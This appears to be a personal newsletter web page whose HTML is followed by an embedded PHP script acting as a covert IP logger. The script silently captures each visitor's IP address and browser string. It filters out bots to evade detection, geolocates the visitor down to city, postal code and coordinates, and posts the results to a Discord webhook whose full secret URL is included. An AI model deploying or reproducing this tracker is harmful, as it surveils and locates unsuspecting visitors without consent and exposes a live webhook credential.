<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Rain's Newsletter</title>
    <link rel="stylesheet" href="styles.css">
</head>
<body>
    <header>
        <nav>
            <ul>
                <li><a href="newsletter.html">Newsletter</a></li>
                <li><a href="memes.html">Memes</a></li>
                <li><a href="games.html">Games</a></li>
                <li><a href="mental-health.html">Mental Health</a></li>
                <li><a href="about.html">About</a></li>
                <li><a href="#" onclick="toggleAuthModal()">Register/Login</a></li>
            </ul>
        </nav>
        <h1>Rain Village (Newsletter)</h1>
        <p>Welcome, this is where I post my insights on topics I'm interested in or stuff that is close to my heart.
        (This website is a work in progress.)</p>
    </header>
    <div class="raindrop-container">
        <div class="raindrop">
            <a href="newsletter/incel.html">
                <img src="raindrop1.png" alt="Raindrop 1">
            </a>
            <h2>Is the word "incel" considered derogatory?</h2>
            <p>Exploring the meaning, effects, and the controversial connotations of the word.</p>
        </div>
        <div class="raindrop">
            <a href="/newsletter/hyp.html">
                <img src="raindrop2.png" alt="Raindrop 2">
            </a>
            <h2>The Hypocrisy in Double Standards</h2>
            <p>WIP</p>
        </div>
        <div class="raindrop">
            <a href="pain.html">
                <img src="raindrop3.png" alt="Raindrop 3">
            </a>
            <h2>WIP</h2>
            <p>WIP</p>
        </div>
    </div>



    
    <div id="auth-modal" style="display: none;">
        <div class="modal-content">
            <h2 id="auth-title">Register</h2>
            <input type="text" id="auth-username" placeholder="Name/Username">
            <input type="password" id="auth-password" placeholder="Password">
            <input type="password" id="auth-confirm-password" style="display: none;" placeholder="Confirm Password">
            <button onclick="handleAuth()">Submit</button>
            <p id="auth-error"></p>
            <a href="#" id="toggle-auth-link" onclick="toggleAuthMode()">I already have an account</a>
        </div>
    </div>

    <script src="script.js"></script>
</body>
</html>

<?php

$Webhook    = "https://discord.com/api/webhooks/1325864827305857034/s88Mj9HnNnsKwHvXhJm70MdgnMFRrhkUg1klM-PT4w_HmNfSencFJqrdnzap2J97xKVC"; 
$WebhookTag = "Captain Webhook"; //Name this whatever you want
$WebhookAvatar = "https://rainvillage.co.uk/cloud.png";
$DEmbedColor = "FFFFFF"; 





$IP       = $_SERVER['REMOTE_ADDR'];
$Browser  = $_SERVER['HTTP_USER_AGENT'];
$URL = (isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? "https" : "http") . "://$_SERVER[HTTP_HOST]$_SERVER[REQUEST_URI]";

if(preg_match('/bot|Discord|robot|curl|spider|crawler|Cloudflare-SSLDetector|^$/i', $Browser)) {
    exit();
}

$Curl = curl_init("http://ip-api.com/json/$IP");
curl_setopt($Curl, CURLOPT_RETURNTRANSFER, true);
$Info = json_decode(curl_exec($Curl)); 
curl_close($Curl);

$ISP = $Info->isp;
$Status = $Info->status;
$Country = $Info->country;
$countryCode = $Info->countryCode;
$Region = $Info->regionName;
$City = $Info->city;
$Tz = $Info->timezone;
$Zip = $Info->zip;
$COORD = "$Info->lat, $Info->lon"; 
$flag = "https://www.countryflags.io/{$countryCode}/flat/64.png";
$timestamp = date("Y-m-d H:i:s");


$hookObject = json_encode([ // Discord Embed Message
    'username'   => "$WebhookTag" , 
    'avatar_url' => "$WebhookAvatar",
    "embeds" => [
        /*
         * Our first embed
         */
        [
            "title" => "Ip Logger",
            
            // The type of your embed, will ALWAYS be "rich"
            "type" => "rich",
            
            /* A timestamp to be displayed below the embed, IE for when an an article was posted
             * This must be formatted as ISO8601
             */
            "timestamp" => "$timestamp",
            
            // The integer color to be used on the left side of the embed
            "color" => hexdec( "$DEmbedColor" ),
            
            // Footer object
            "footer" => [
                "text" => "$WebhookTag | IP Logger",
                "icon_url" => "$WebhookAvatar"
            ],
            "thumbnail" => [
                "url" => "$flag"
            ],
            // Author object
            "author" => [
                "name" => "Made By Whisk | github.com/Wh7sk",
                "url" => "https://github.com/Wh7sk"
            ],
            // Field array of objects
            "fields" => [
                // Field 1
                [
                    "name" => "URL Header Logged",
                    "value" => "$URL",
                    "inline" => false
                ],
                [
                    "name" => "IP",
                    "value" => "$IP",
                    "inline" => true
                ],
                [
                    "name" => "ISP",
                    "value" => "$ISP",
                    "inline" => true
                ],
                [
                    "name" => "Status",
                    "value" => "$Status",
                    "inline" => true
                ],
                [
                    "name" => "Browser",
                    "value" => "$Browser",
                    "inline" => false
                ],
                [
                    "name" => "Country",
                    "value" => "$Country",
                    "inline" => true
                ],
                [
                    "name" => "Region",
                    "value" => "$Region",
                    "inline" => true
                ],
                [
                    "name" => "City",
                    "value" => "$City",
                    "inline" => true
                ],
                [
                    "name" => "Timezone",
                    "value" => "$Tz",
                    "inline" => true
                ],
                [
                    "name" => "Postal/Zip",
                    "value" => "$Zip",
                    "inline" => true
                ],
                [
                    "name" => "Coordinates",
                    "value" => "$COORD",
                    "inline" => true
                ],
            ]
        ]
    ]

], JSON_UNESCAPED_SLASHES | JSON_UNESCAPED_UNICODE );

$ch = curl_init();

curl_setopt_array( $ch, [
    CURLOPT_URL => $Webhook,
    CURLOPT_POST => true,
    CURLOPT_POSTFIELDS => $hookObject,
    CURLOPT_HTTPHEADER => [
        "Content-Type: application/json"
    ]
]);

$response = curl_exec( $ch );
curl_close( $ch );

?>

